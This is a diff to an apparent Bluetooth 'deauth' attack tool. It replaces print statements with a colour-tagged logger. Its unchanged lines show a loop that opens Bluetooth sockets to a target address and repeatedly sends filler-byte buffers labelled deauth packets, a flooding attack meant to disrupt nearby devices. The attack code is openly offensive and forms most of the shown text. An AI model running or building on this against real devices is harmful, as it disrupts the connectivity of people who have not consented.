@@ -1,4 +1,5 @@
 import bluetooth
+import logger
 import time
 
 from utils.async_utils import create_async_task
@@ -10,10 +11,10 @@ def deauth(target: str, port: int, protocol: BTProtocol, packet_size: int, worke
 
     while True:
         job = f"Job-{job_id}"
-        prefix = f" > [{worker} | {job}]    "
+        prefix = f" <lblack>[{worker} | {job}]<reset>    "
         
         # Create socket.
-        print(f"{prefix}Connecting {target} using {protocol.name.upper()} protocol (Port {port})...")
+        logger.info(f"{prefix}Connecting <lgreen>{target}<reset> using <lgreen>{protocol.name.upper()}<reset> protocol (Port <lgreen>{port}<reset>)...")
         sock = bluetooth.BluetoothSocket(protocol.value)  
         bd_dev = (target, port)
         
@@ -24,10 +25,10 @@ def deauth(target: str, port: int, protocol: BTProtocol, packet_size: int, worke
             
             # Send deauth packet
             payload = b'\x01' * packet_size
-            print(f"{prefix}Sending deauth packets to {target} ({len(payload)} buffer size) ...")
+            logger.info(f"{prefix}Sending deauth packets to <lgreen>{target}<reset> (<lgreen>{len(payload)} buffer size<reset>) ...")
             sock.send(payload)
         except bluetooth.BluetoothError as e:
-            print(f"{prefix}Failed to connect to {target}: {e}")
+            logger.err(f"{prefix}<lred>Failed to connect to {target}: {e}")
             break
         finally:
             sock.close()
